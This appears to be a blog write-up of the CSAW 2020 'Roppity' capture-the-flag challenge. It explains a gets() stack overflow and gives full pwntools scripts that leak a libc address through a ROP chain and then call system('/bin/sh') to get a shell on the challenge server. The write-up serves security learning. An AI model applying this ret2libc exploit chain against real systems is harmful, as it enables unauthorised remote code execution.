---
layout: post
title: "CSAW Roppity"
date: 2020-09-15 09:00:12
categories: blog
---

Writeup for CSAW roppity Challenge

<!--more-->

## Roppity (Pwn 50 pts)

### Challenge

> We given a binary file `rop` and libc file `libc-2` .
> The title of challenge suggests it is a ROP(Return-Oriented Programming) challenge

Analysing File:

```
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d177aa372f308c07c8daaddec53df7c5aafd630, not stripped
```

Checksec:

```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Decompile with Hopper.

```C
int main() {
    init();
    puts("Hello");
    gets(&var_20);
    return 0x0;
}
```

The main function prints the hello then takes our input using gets and exits

So Basic Idea of Exploitation

Using puts_got address as argument to puts_plt so that we can leak the puts address,Then get back to main so we can exploit the overflow again.

**Leaking Libc_base:**

```python
from pwn import *
buf = 40*'A'
elf = ELF('./rop')
p = remote('pwn.chal.csaw.io',5016)
libc = ELF('libc-2.27.so')
context.clear(arch='amd64')
rop = ROP('rop')
puts_plt = elf.plt['puts']
main = elf.symbols['main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
puts_got = elf.got['puts']
payload1 = buf #Overwrite RIP
payload1 += p64(pop_rdi) #Sets the address of gadget so next address saves into the RDI registry
payload1 += p64(puts_got) #puts_got to save in RDI (to argument for the following function)
payload1 += p64(puts_plt) #calling puts_plt ,so puts will read the content inside puts_got and will print it out.
payload1 += p64(main) #to get back to main function
p.clean()
p.sendline(payload1)
recieved = p.recvline().strip()
puts_leak = u64(recieved.ljust(8, "\x00"))
libc.address = puts_leak - libc.symbols['puts']
log.info("Leaked libc address",hex(libc.address))
```

We got the Libc_base, the thing is to get shell .

Finding `system` function address and `/bin/sh` string address

```python
binsh = next(libc.search("/bin/sh"))
system = libc.sym["system"]
```

We have everything we need to get shell

## The Final Script to get Shell

```python
from pwn import *
buf = 40*'A'
elf = ELF('./rop')
p = remote('pwn.chal.csaw.io',5016)
libc = ELF('libc-2.27.so')
context.clear(arch='amd64')
rop = ROP('rop')
puts_plt = elf.plt['puts']
main = elf.symbols['main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
puts_got = elf.got['puts']
paylaod1 = buf
paylaod1 += p64(pop_rdi)
paylaod1 += p64(puts_got)
paylaod1 += p64(puts_plt)
paylaod1 += p64(main)
p.clean()
p.sendline(paylaod1)
recieved = p.recvline().strip()
puts_leak = u64(recieved.ljust(8, "\x00"))
libc.address = puts_leak - libc.symbols['puts']
log.info("Leaked libc address",hex(libc.address))
binsh = next(libc.search("/bin/sh"))
system = libc.sym["system"]
exit = libc.sym["exit"]
payload2 = buf  #buffer to overwrite RIP
payload2 += p64(ret) # to align Stack
payload2 += p64(pop_rdi) # to put the next address into RDI
payload2 += p64(binsh)  #bin/sh address
payload2 += p64(system) # call to system; system('bin/sh')
payload2 += p64(exit) # fake functioin address
p.clean()
p.sendline(payload2)
p.interactive()
```
